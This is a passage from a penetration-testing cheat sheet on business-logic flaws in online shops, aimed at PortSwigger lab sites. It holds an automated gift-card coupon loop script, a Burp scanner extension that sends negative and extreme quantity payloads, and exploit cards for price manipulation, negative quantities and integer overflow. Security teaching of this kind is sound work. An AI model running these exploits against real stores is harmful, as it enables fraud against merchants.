        match = re.search(r'Store credit:\s*\$([0-9,]+\.[0-9]{2})', response.text)
        if match:
            return float(match.group(1).replace(',', ''))
        return None

    def execute_loop(self, target_credit=1400):
        """Execute gift card purchase and redemption loop"""
        initial_credit = self.get_store_credit()
        print(f"[*] Initial store credit: ${initial_credit}")
        print(f"[*] Target credit: ${target_credit}")

        cycles = 0
        while True:
            current_credit = self.get_store_credit()
            if current_credit >= target_credit:
                print(f"\n[+] Target reached! Final credit: ${current_credit}")
                break

            cycles += 1
            print(f"\n[*] Cycle {cycles} - Current credit: ${current_credit}")

            # Step 1: Add gift card
            print("  [*] Adding gift card to cart...")
            if not self.add_gift_card_to_cart():
                print("  [-] Failed to add gift card")
                continue

            # Step 2: Apply coupon
            print("  [*] Applying discount coupon...")
            if not self.apply_coupon():
                print("  [-] Failed to apply coupon")
                continue

            # Step 3: Checkout
            print("  [*] Checking out...")
            checkout_response = self.checkout()

            # Step 4: Extract gift card code
            print("  [*] Extracting gift card code...")
            gift_card_code = self.extract_gift_card_code(checkout_response.text)
            if not gift_card_code:
                print("  [-] Failed to extract gift card code")
                continue
            print(f"  [+] Got code: {gift_card_code}")

            # Step 5: Redeem gift card
            print("  [*] Redeeming gift card...")
            if not self.redeem_gift_card(gift_card_code):
                print("  [-] Failed to redeem gift card")
                continue

            print(f"  [+] Cycle complete! Profit: $3")

            # Rate limiting courtesy delay
            time.sleep(0.5)

        print(f"\n[+] Exploit complete! Executed {cycles} cycles.")
        print(f"[+] Total profit: ${current_credit - initial_credit}")

# Usage
exploit = GiftCardExploit(
    base_url="https://lab-id.web-security-academy.net",
    username="wiener",
    password="peter"
)
exploit.execute_loop(target_credit=1400)
```

---

### Script 6: Burp Suite Extension - Business Logic Tester

```python
# Burp Extension: Business Logic Scanner
# Save as business_logic_scanner.py and load in Burp Extender

from burp import IBurpExtender, IScannerCheck, IScanIssue
from java.net import URL

class BurpExtender(IBurpExtender, IScannerCheck):

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Business Logic Scanner")
        callbacks.registerScannerCheck(self)
        print("[+] Business Logic Scanner loaded")

    def doPassiveScan(self, baseRequestResponse):
        issues = []

        # Get request details
        request = baseRequestResponse.getRequest()
        request_info = self._helpers.analyzeRequest(baseRequestResponse)
        url = request_info.getUrl()
        parameters = request_info.getParameters()

        # Check for price parameters
        for param in parameters:
            param_name = param.getName().lower()
            if any(keyword in param_name for keyword in ['price', 'cost', 'amount', 'total']):
                issues.append(CustomScanIssue(
                    baseRequestResponse.getHttpService(),
                    url,
                    [baseRequestResponse],
                    "Client-Side Price Parameter Detected",
                    f"The parameter '{param.getName()}' may allow client-side price manipulation.",
                    "High"
                ))

        return issues

    def doActiveScan(self, baseRequestResponse, insertionPoint):
        # Active scanning for business logic flaws
        issues = []

        # Test negative values
        if insertionPoint.getInsertionPointName().lower() in ['quantity', 'amount']:
            # Build attack payloads
            attack_payloads = ["-1", "-100", "-999", "0", "999999"]

            for payload in attack_payloads:
                check_request = insertionPoint.buildRequest(payload)
                check_response = self._callbacks.makeHttpRequest(
                    baseRequestResponse.getHttpService(),
                    check_request
                )

                # Analyze response for acceptance
                response_body = self._helpers.bytesToString(check_response.getResponse())
                if "error" not in response_body.lower() and "invalid" not in response_body.lower():
                    issues.append(CustomScanIssue(
                        baseRequestResponse.getHttpService(),
                        self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                        [check_response],
                        "Negative Value Accepted",
                        f"The application accepts negative value '{payload}' in '{insertionPoint.getInsertionPointName()}'",
                        "High"
                    ))

        return issues

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        if existingIssue.getIssueName() == newIssue.getIssueName():
            return -1
        return 0

class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return "Certain"

    def getIssueBackground(self):
        return "Business logic vulnerabilities allow attackers to manipulate application workflows."

    def getRemediationBackground(self):
        return "Implement server-side validation for all business-critical parameters."

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        return "Validate all user input on the server side, especially financial parameters."

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService
```

---

## Quick Reference Cards

### Price Manipulation Quick Reference

```plaintext
┌─────────────────────────────────────────────┐
│ PRICE MANIPULATION                           │
├─────────────────────────────────────────────┤
│ Identify: POST /cart with price parameter    │
│ Test: price=1, price=0, price=-1000         │
│ Burp: Send to Repeater, modify, send       │
│ Verify: Refresh cart, check total          │
│ Exploit: Checkout if affordable             │
└─────────────────────────────────────────────┘
```

### Negative Quantity Quick Reference

```plaintext
┌─────────────────────────────────────────────┐
│ NEGATIVE QUANTITY                           │
├─────────────────────────────────────────────┤
│ Setup: Add expensive item (×1)              │
│ Calculate: -(expensive/cheap)               │
│ Exploit: Add cheap item × negative qty     │
│ Result: Total reduced/negative              │
│ Fine-tune: Add items to reach target        │
└─────────────────────────────────────────────┘
```

### Integer Overflow Quick Reference

```plaintext
┌─────────────────────────────────────────────┐
│ INTEGER OVERFLOW                            │
├─────────────────────────────────────────────┤
│ Trigger: Add items until overflow           │
│ Burp: Intruder, null payloads, max=1       │
│ Monitor: Watch for negative total           │
│ Stop: When overflow occurs                  │
│ Adjust: Fine-tune to affordable positive    │
└─────────────────────────────────────────────┘
```

### Gift Card Loop Quick Reference

```plaintext
┌─────────────────────────────────────────────┐
│ GIFT CARD LOOP                              │
├─────────────────────────────────────────────┤
│ Get: Discount coupon (30%)                  │
│ Buy: $10 gift card with coupon ($7)        │
│ Redeem: Gift card for $10 credit           │
│ Profit: $3 per cycle                        │
│ Automate: Burp Macro (5 steps)             │
└─────────────────────────────────────────────┘
```

---

## Testing Checklist

Copy this checklist for each application test:

```plaintext
BUSINESS LOGIC TESTING CHECKLIST

FINANCIAL PARAMETERS:
[ ] Price manipulation (client-side)
[ ] Quantity manipulation (negative)
[ ] Integer overflow testing
[ ] Discount/coupon stacking
[ ] Gift card loops
[ ] Currency manipulation

WORKFLOW TESTING:
[ ] Step skipping
[ ] Out-of-order execution
[ ] Confirmation replay
[ ] State machine bypass
[ ] Payment bypass

INPUT VALIDATION:
[ ] Negative values
[ ] Zero values
[ ] Extreme values (INT_MAX)
[ ] Null/empty values
[ ] Type confusion

AUTHORIZATION:
[ ] Email domain bypass
[ ] Role escalation
[ ] Direct admin access
[ ] Session manipulation

RATE LIMITING:
[ ] Operation flooding
[ ] Automated exploitation
[ ] Concurrent requests
```

---

**Note:** These techniques are for authorized penetration testing and security research only. Always obtain proper authorization before testing any system.

This cheat sheet provides comprehensive coverage of business logic vulnerability exploitation. Combine with the quickstart guide for rapid testing and the resources document for deeper understanding.
